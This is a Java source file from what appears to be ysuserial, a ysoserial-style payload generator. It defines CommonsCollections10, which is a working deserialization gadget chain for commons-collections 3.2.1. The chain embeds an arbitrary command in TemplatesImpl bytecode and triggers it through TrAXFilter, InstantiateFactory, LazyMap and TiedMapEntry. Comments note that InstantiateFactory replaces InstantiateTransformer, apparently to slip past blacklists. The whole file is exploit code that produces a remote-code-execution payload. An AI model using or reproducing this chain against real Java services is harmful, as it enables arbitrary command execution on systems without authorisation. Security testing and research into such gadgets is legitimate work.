package org.su18.ysuserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.ysuserial.payloads.annotation.Dependencies;
import org.su18.ysuserial.payloads.util.Gadgets;

import javax.xml.transform.Templates;
import java.util.HashMap;
import java.util.Map;

import static org.su18.ysuserial.payloads.util.Reflections.setFieldValue;

/**
 * @author su18
 */
@Dependencies({"commons-collections:commons-collections:3.2.1"})
public class CommonsCollections10 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(command);

		// 使用 InstantiateFactory 代替 InstantiateTransformer
		InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});

		FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);

		// 先放一个无关键要的 Transformer
		ConstantTransformer constantTransformer = new ConstantTransformer(1);

		Map     innerMap = new HashMap();
		LazyMap outerMap = (LazyMap) LazyMap.decorate(innerMap, constantTransformer);

		TiedMapEntry tme    = new TiedMapEntry(outerMap, "su18");
		Map          expMap = new HashMap();
		expMap.put(tme, "su19");

		setFieldValue(outerMap, "factory", factoryTransformer);

		outerMap.remove("su18");

		return expMap;
	}
}
